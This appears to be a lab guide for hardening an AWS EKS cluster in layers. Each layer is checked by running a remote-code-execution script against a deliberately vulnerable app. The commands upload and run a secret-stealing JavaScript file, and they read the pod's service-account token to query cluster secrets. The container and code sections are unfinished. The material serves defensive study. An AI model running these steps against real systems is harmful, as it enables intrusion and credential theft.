# reat2shell: Cluster hardening

[Back](../README.md)

- [reat2shell: Cluster hardening](#reat2shell-cluster-hardening)
  - [Overview](#overview)
    - [Steps](#steps)
  - [Cloud layer hardening](#cloud-layer-hardening)
    - [Root cause analysis](#root-cause-analysis)
    - [Setup environment](#setup-environment)
    - [Confirm](#confirm)
  - [Cluster layer hardening](#cluster-layer-hardening)
    - [Root cause analysis](#root-cause-analysis-1)
    - [Setup environment](#setup-environment-1)
    - [Confirm](#confirm-1)
  - [Container layer hardening](#container-layer-hardening)
    - [Root cause analysis](#root-cause-analysis-2)
    - [Setup environment](#setup-environment-2)
    - [Confirm](#confirm-2)
  - [Code lay hardening](#code-lay-hardening)
    - [Root cause analysis](#root-cause-analysis-3)
    - [Setup environment](#setup-environment-3)
    - [Confirm](#confirm-3)

---

## Overview

- Perspective: Cluster security specialist
- Goal: show how to harden a cluster
- Url: `http://react2shell.arguswatcher.net:3000`

---

### Steps

| #   | Steps                       | Layers    | Env                                  | Milestone                           |
| --- | --------------------------- | --------- | ------------------------------------ | ----------------------------------- |
| 0   | Harden cloud with terraform | cloud     | eks-secure + insecure-apps-cloud     | secure RDS secret                   |
| 1   | Harden cluster              | cluster   | eks-secure + insecure-apps-cluster   | secure cluster secret, internal api |
| 2   | Harden container            | container | eks-secure + insecure-apps-container | secure sa token, apiserver, ESO     |
| 3   | Harden code                 | code      | eks-secure + secure-apps             | disable exploit                     |

---

## Cloud layer hardening

### Root cause analysis

- Issues:
  - EKS pod is granted access to secretmanager
  - AWS context get injected into the pod
- Root cause
  - broad IRSA `*/*`
  - pod annotation with aws role
- Fix
  - Remove `pod-irsa` role

---

### Setup environment

- Environment:
  - infra: eks-secure
  - manifests: insecure-apps-cloud

```sh
# trivy scan
trivy config infra/eks-secure --severity HIGH,CRITICAL

# provision eks cluster
terraform -chdir=infra/eks-secure apply -auto-approve
aws eks update-kubeconfig --region ca-central-1 --name react2shell-eks-secure

# deploy apps
kubectl apply -f argocd/insecure-root-app-cloud.yaml
# port forward
kubectl port-forward service/react2shell -n react 3000:3000
```

---

### Confirm

```sh
VICTIM_URL="http://react2shell.arguswatcher.net:3000"

kubectl rollout restart deploy/react2shell -n react

# ##############################
# Attack
# ##############################
# 1. confirm RCE by id — app still vulnerable (code/container/cluster unhardened)
python scripts/rce.py $VICTIM_URL "id"
# uid=0(root) gid=0(root) groups=0(root)

# 2. look for an AWS identity — none projected (annotation removed, role gone)
python scripts/rce.py $VICTIM_URL "env | grep AWS"
# no output
# no AWS_ROLE_ARN / AWS_WEB_IDENTITY_TOKEN_FILE

# 3. upload js
b64=$(base64 -w0 scripts/steal_secret.js)
python3 scripts/rce.py $VICTIM_URL "echo $b64 | base64 -d > /tmp/s.js"

# 4. try to grab the jewel — no credentials to assume any role
python3 scripts/rce.py $VICTIM_URL "node /tmp/s.js --list"
# no IRSA env (AWS_ROLE_ARN / AWS_WEB_IDENTITY_TOKEN_FILE)
```

- no AWS environment variables

![cloud01](./img/harden/cloud01.png)

- Cannot list cloud secret

![cloud02](./img/harden/cloud02.png)

---

## Cluster layer hardening

### Root cause analysis

| Issue                    | Root cause                          | fix                    |
| ------------------------ | ----------------------------------- | ---------------------- |
| Access to internal-api   | flat network without network policy | Add network policy     |
| Access to cluster secret | board RBAC permission               | grant least permission |

---

### Setup environment

- Environment:
  - infra: eks-secure
  - manifests: insecure-apps-cluster

```sh
# provision eks cluster
terraform -chdir=infra/eks-secure apply -auto-approve
aws eks update-kubeconfig --region ca-central-1 --name react2shell-eks-insecure

# deploy apps
kubectl apply -f argocd/insecure-root-app-cluster.yaml
# port forward
kubectl port-forward service/react2shell -n react 3000:3000
```

---

### Confirm

```sh
# ##############################
# RBAC: sa permission
# ##############################
# list permissions as sa
kubectl auth can-i --list --as=system:serviceaccount:react:react2shell -n react

# can list secret
kubectl auth can-i list secrets --all-namespaces --as=system:serviceaccount:secure-frontend:react2shell

# confirm
python scripts/rce.py $VICTIM_URL 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/secrets'

# secure: cannot query ns
python scripts/rce.py $VICTIM_URL 'APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces'
```

```sh
# ##############################
# Network policy: internal-api
# ##############################
# confirm netpol
kubectl get netpol -n internal
# NAME                        POD-SELECTOR    AGE
# allow-dns-egress            <none>          81s
# allow-nginx-api-from-prod   app=nginx-api   81s
# default-deny-all            <none>          81s

# confirm
python scripts/rce.py $VICTIM_URL "curl -sS -m 5 http://backend-api.secure-backend/api/v1/users"
# curl: (28) Connection timed out after 5001 milliseconds
```

---

## Container layer hardening

### Root cause analysis

| Issue | Root cause | fix |
| ----- | ---------- | --- |
|       | IAM        |     |
|       | IRSA       |     |

---

### Setup environment

- Environment:
  - infra: eks-secure
  - manifests: insecure-apps-container

```sh
# provision eks cluster
terraform -chdir=infra/eks-secure apply -auto-approve
aws eks update-kubeconfig --region ca-central-1 --name react2shell-eks-insecure

# deploy apps
kubectl apply -f argocd/insecure-root-app-container.yaml
# port forward
kubectl port-forward service/react2shell -n react 3000:3000
```

---

### Confirm

```sh

```

---

## Code lay hardening

### Root cause analysis

| Issue | Root cause | fix |
| ----- | ---------- | --- |
|       | IAM        |     |
|       | IRSA       |     |

---

### Setup environment

- Environment:
  - infra: eks-secure
  - manifests: secure-apps

```sh
# provision eks cluster
terraform -chdir=infra/eks-secure apply -auto-approve
aws eks update-kubeconfig --region ca-central-1 --name react2shell-eks-insecure

# deploy apps
kubectl apply -f argocd/secure-root-app.yaml
# port forward
kubectl port-forward service/react2shell -n react 3000:3000
```

---

### Confirm

```sh

```

---
